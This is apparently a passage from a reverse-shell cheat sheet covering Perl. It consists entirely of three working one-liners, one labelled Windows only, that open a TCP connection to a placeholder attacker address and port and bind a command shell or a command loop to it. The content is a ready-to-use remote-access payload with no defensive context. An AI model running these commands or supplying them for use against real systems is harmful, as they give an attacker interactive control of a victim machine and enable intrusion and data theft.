#### Perl

```perl
perl -e 'use Socket;$i="$ATTACKER_IP";$p=$ATTACKER_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"$ATTACKER_IP:$ATTACKER_PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'


NOTE: Windows only
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"$ATTACKER_IP:$ATTACKER_PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```